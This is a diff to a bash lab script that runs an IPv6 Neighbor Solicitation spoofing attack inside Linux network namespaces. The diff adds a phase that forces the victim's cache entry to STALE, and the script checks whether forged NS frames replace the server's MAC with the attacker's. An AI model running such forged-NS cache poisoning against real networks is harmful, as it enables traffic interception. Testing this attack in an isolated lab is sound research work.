@@ -9,9 +9,13 @@
 #             its IPv6 source and the attacker's MAC as the Source Link-Layer Address option.
 #
 # Phases:
-#   control: the victim pings the server. Its cache entry for SERVER_ADDR must hold the server's MAC.
-#   attack:  the victim pings the server, then the attacker sends forged NSs to the victim. The entry
-#            for SERVER_ADDR must now hold the attacker's MAC.
+#   control:        the victim pings the server. Its cache entry for SERVER_ADDR must hold the
+#                   server's MAC.
+#   attack_stale:   the victim pings the server, then its entry is forced to STALE, the state RFC 4861
+#                   leaves a neighbor in after the reachability timer. The attacker then sends forged
+#                   NSs. The entry must now hold the attacker's MAC. This is the verdict.
+#   attack_reachable: the same, without forcing STALE, so the entry stays REACHABLE right after the
+#                   ping. Informational: it shows whether Linux accepts the NS while REACHABLE.
 #
 # Addresses are static, with no duplicate address detection, so the lab checks only the cache.
 #
@@ -20,7 +24,7 @@
 # Usage:
 #   sudo scripts/lab/neighbor_solicitation_spoofing_lab.sh
 #
-# Exit 0 when the control holds the server's MAC and the attack replaces it with the attacker's MAC.
+# Exit 0 when the control holds the server's MAC and attack_stale replaces it with the attacker's MAC.
 # Exit 1 when either does not. Exit 2 when the setup failed.
 #
 # Requirements: iproute2 (ip), IPv6 in the kernel, and the project virtualenv (.venv) with scapy.
@@ -33,7 +37,7 @@ if [[ "$(id -u)" -ne 0 ]]; then
     exit 1
 fi
 
-for tool in ip bridge ping; do
+for tool in ip ping awk; do
     if ! command -v "$tool" >/dev/null 2>&1; then
         echo "Missing required tool: $tool" >&2
         exit 1
@@ -94,9 +98,20 @@ cache_state() {
     ip netns exec victim ip -6 neigh show dev v0 "$SERVER_ADDR" | awk '{print $NF}'
 }
 
-# Wait for the victim to learn the server's address with a ping.
+# Make the victim learn the server's address with a ping.
 learn_server() {
     ip netns exec victim ping -6 -c 2 -W 1 "$SERVER_ADDR" >/dev/null 2>&1 || true
+    sleep 1
+}
+
+# Move the victim's entry for the server to STALE, keeping the server's MAC.
+force_stale() {
+    ip netns exec victim ip -6 neigh replace "$SERVER_ADDR" lladdr "$SERVER_MAC" dev v0 nud stale
+}
+
+send_forged_ns() {
+    ip netns exec attacker "$PY" -m macabre.attacks.neighbor_solicitation_spoofing a1 \
+        --source-mac "$ATTACKER_MAC" --target "$SERVER_ADDR" --receiver "$VICTIM_ADDR" --frames 3
     sleep 1
 }
 
@@ -106,23 +121,31 @@ learn_server
 control_lladdr=$(cache_lladdr)
 echo "victim's cache for $SERVER_ADDR: lladdr=${control_lladdr:-none} state=$(cache_state)"
 
-echo "=== attack ==="
+echo "=== attack_stale ==="
 build_topology
 learn_server
-echo "before the attack: lladdr=$(cache_lladdr)"
-ip netns exec attacker "$PY" -m macabre.attacks.neighbor_solicitation_spoofing a1 \
-    --source-mac "$ATTACKER_MAC" --target "$SERVER_ADDR" --receiver "$VICTIM_ADDR" --frames 3
-sleep 1
-attack_lladdr=$(cache_lladdr)
-echo "after the attack:  lladdr=${attack_lladdr:-none} state=$(cache_state)"
+force_stale
+echo "before the attack: lladdr=$(cache_lladdr) state=$(cache_state)"
+send_forged_ns
+stale_lladdr=$(cache_lladdr)
+echo "after the attack:  lladdr=${stale_lladdr:-none} state=$(cache_state)"
+
+echo "=== attack_reachable (informational) ==="
+build_topology
+learn_server
+echo "before the attack: lladdr=$(cache_lladdr) state=$(cache_state)"
+send_forged_ns
+reachable_lladdr=$(cache_lladdr)
+echo "after the attack:  lladdr=${reachable_lladdr:-none} state=$(cache_state)"
 
 echo
-echo "control: the cache holds the server's MAC ($SERVER_MAC): $([[ "$control_lladdr" == "$SERVER_MAC" ]] && echo yes || echo no)"
-echo "attack:  the cache holds the attacker's MAC ($ATTACKER_MAC): $([[ "$attack_lladdr" == "$ATTACKER_MAC" ]] && echo yes || echo no)"
+echo "control:          the cache holds the server's MAC ($SERVER_MAC): $([[ "$control_lladdr" == "$SERVER_MAC" ]] && echo yes || echo no)"
+echo "attack_stale:     the cache holds the attacker's MAC ($ATTACKER_MAC): $([[ "$stale_lladdr" == "$ATTACKER_MAC" ]] && echo yes || echo no)"
+echo "attack_reachable: the cache holds the attacker's MAC: $([[ "$reachable_lladdr" == "$ATTACKER_MAC" ]] && echo yes || echo no) (informational)"
 
-if [[ "$control_lladdr" == "$SERVER_MAC" && "$attack_lladdr" == "$ATTACKER_MAC" ]]; then
-    echo "PASS: a forged Neighbor Solicitation replaces the victim's cached MAC for the server's address."
+if [[ "$control_lladdr" == "$SERVER_MAC" && "$stale_lladdr" == "$ATTACKER_MAC" ]]; then
+    echo "PASS: a forged Neighbor Solicitation replaces the victim's cached MAC for a STALE entry."
     exit 0
 fi
-echo "FAIL: the victim's cache did not change as expected."
+echo "FAIL: the victim's cache did not change as expected for a STALE entry."
 exit 1
